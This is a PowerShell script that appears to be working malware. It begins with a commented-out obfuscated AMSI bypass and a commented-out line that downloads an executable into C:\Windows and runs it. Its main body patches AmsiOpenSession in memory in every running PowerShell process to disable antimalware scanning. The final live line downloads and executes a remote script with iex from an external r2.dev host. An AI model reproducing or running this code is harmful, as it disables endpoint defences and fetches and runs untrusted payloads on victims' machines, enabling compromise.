# ${w} = ("{11}{2}{6}{13}{9}{5}{8}{0}{4}{7}{3}{10}{1}{12}"-f('B1'+'AH'),'uA',('B5'+'A'+'HM'+'A'+'d'+(('A'+('B'+('lA'+'G')))+'0'+('AL'+'g'))+('B'+('NA'+'G'))),('B'+((('tA'+'G')+'E')+'A')),'Q',(((('U'+'Ab')+'gB')+'0')+'A'+'C'+'4A'),'EA',('Ab'+'w'),'QQ',(((('AG'+'c')+'A')+'Z'+'Q')+('Bt'+'A')+'G'),('d'+(('AB'+'pA')+('G'+'8A')+'bg')+'A'),'Uw',('EE'+'A'),(('b'+'gB')+'h'));${c} = ("{0}{1}{2}"-f (('c'+'wB')+'p'),('A'+'A='),'=');${M} = ("{0}{3}{1}{2}{4}" -f 'VQ',('k'+('Ab'+'A')),'Bz',('B0'+'AG'),('AA'+'=='));${ASSEM`B`ly} = [Ref].Assembly.GetType(('{0}m{1}{2}' -f [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(${w})),[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(${c})),[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(${M}))));${F`i`ELd} = ${ass`EmB`Ly}.GetField(('am{0}InitFailed' -f [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(${c}))),("{0}{3}{1}{2}{4}"-f ('No'+'nP'),('c,'+'St'+'at'),'i',('u'+('bl'+'i')),'c'));${F`ie`Ld}.SetValue(${NU`Ll},${TR`Ue});
#powershell -Command Write-Host "#<NULL>"; "Invoke-WebRequest https://pub-fd29cd63fb8c4b7fb0c7d3fa893212b9.r2.dev/telegramget.exe -OutFile C:\Windows\t.exe"; C:\Windows\t.exe
# ASCII Art Banner





Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class NukeAMSI
{
    public const int PROCESS_VM_OPERATION = 0x0008;
    public const int PROCESS_VM_READ = 0x0010;
    public const int PROCESS_VM_WRITE = 0x0020;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;

    // NtOpenProcess: Opens a handle to a process.
    [DllImport("ntdll.dll")]
    public static extern int NtOpenProcess(out IntPtr ProcessHandle, uint DesiredAccess, [In] ref OBJECT_ATTRIBUTES ObjectAttributes, [In] ref CLIENT_ID ClientId);

    // NtWriteVirtualMemory: Writes to the memory of a process.
    [DllImport("ntdll.dll")]
    public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);

    // NtClose: Closes an open handle.
    [DllImport("ntdll.dll")]
    public static extern int NtClose(IntPtr Handle);

    // LoadLibrary: Loads the specified module into the address space of the calling process.
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    // GetProcAddress: Retrieves the address of an exported function or variable from the specified dynamic-link library (DLL).
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    // VirtualProtectEx: Changes the protection on a region of memory within the virtual address space of a specified process.
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public int Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }
}
"@

function ModAMSI {
    param (
        [int]$processId
    )

    Write-Host "Modifying AMSI for process ID: $processId" -ForegroundColor Cyan

    $patch = [byte]0xEB  # The patch byte to modify AMSI behavior

    $objectAttributes = New-Object NukeAMSI+OBJECT_ATTRIBUTES
    $clientId = New-Object NukeAMSI+CLIENT_ID
    $clientId.UniqueProcess = [IntPtr]$processId
    $clientId.UniqueThread = [IntPtr]::Zero
    $objectAttributes.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($objectAttributes)

    $hHandle = [IntPtr]::Zero
    $status = [NukeAMSI]::NtOpenProcess([ref]$hHandle, [NukeAMSI]::PROCESS_VM_OPERATION -bor [NukeAMSI]::PROCESS_VM_READ -bor [NukeAMSI]::PROCESS_VM_WRITE, [ref]$objectAttributes, [ref]$clientId)

    if ($status -ne 0) {
        Write-Host "Failed to open process. NtOpenProcess status: $status" -ForegroundColor Red
        return
    }

    Write-Host "Loading amsi.dll..." -ForegroundColor Cyan
    $amsiHandle = [NukeAMSI]::LoadLibrary("amsi.dll")
    if ($amsiHandle -eq [IntPtr]::Zero) {
        Write-Host "Failed to load amsi.dll." -ForegroundColor Red
        [NukeAMSI]::NtClose($hHandle)
        return
    }

    Write-Host "Getting address of AmsiOpenSession function..." -ForegroundColor Cyan
    $amsiOpenSession = [NukeAMSI]::GetProcAddress($amsiHandle, "AmsiOpenSession")
    if ($amsiOpenSession -eq [IntPtr]::Zero) {
        Write-Host "Failed to find AmsiOpenSession function in amsi.dll." -ForegroundColor Red
        [NukeAMSI]::NtClose($hHandle)
        return
    }

    # Calculate the correct patch address by offsetting from AmsiOpenSession function
    $patchAddr = [IntPtr]($amsiOpenSession.ToInt64() + 3)

    Write-Host "Changing memory protection at address $patchAddr to PAGE_EXECUTE_READWRITE..." -ForegroundColor Cyan
    $oldProtect = [UInt32]0
    $size = [UIntPtr]::new(1)  # Correct conversion to UIntPtr
    $protectStatus = [NukeAMSI]::VirtualProtectEx($hHandle, $patchAddr, $size, [NukeAMSI]::PAGE_EXECUTE_READWRITE, [ref]$oldProtect)

    if (-not $protectStatus) {
        Write-Host "Failed to change memory protection." -ForegroundColor Red
        [NukeAMSI]::NtClose($hHandle)
        return
    }

    Write-Host "Patching memory at address $patchAddr with byte 0xEB..." -ForegroundColor Cyan
    $bytesWritten = [System.UInt32]0
    $status = [NukeAMSI]::NtWriteVirtualMemory($hHandle, $patchAddr, [byte[]]@($patch), 1, [ref]$bytesWritten)

    if ($status -eq 0) {
        Write-Host "Memory patched successfully at address $patchAddr." -ForegroundColor Green
    } else {
        Write-Host "Failed to patch memory. NtWriteVirtualMemory status: $status" -ForegroundColor Red
    }

    Write-Host "Restoring original memory protection..." -ForegroundColor Cyan
    $restoreStatus = [NukeAMSI]::VirtualProtectEx($hHandle, $patchAddr, $size, $oldProtect, [ref]$oldProtect)

    if (-not $restoreStatus) {
        Write-Host "Failed to restore memory protection." -ForegroundColor Red
    }

    Write-Host "Closing handle to process with ID $processId." -ForegroundColor Cyan
    [NukeAMSI]::NtClose($hHandle)
}

function ModAllPShells {
    Write-Host "Modifying all PowerShell processes..." -ForegroundColor Cyan
    Get-Process | Where-Object { $_.ProcessName -eq "powershell" } | ForEach-Object {
        Write-Host "Modifying process with ID $_.Id" -ForegroundColor Cyan
        ModAMSI -processId $_.Id
    }
}

Write-Host "Starting AMSI modification script..." -ForegroundColor Cyan
ModAllPShells
Write-Host "AMSI modification script completed." -ForegroundColor Green
iex (New-Object Net.WebClient).DownloadString('https://pub-fd29cd63fb8c4b7fb0c7d3fa893212b9.r2.dev/telegramget-stream.ps1');
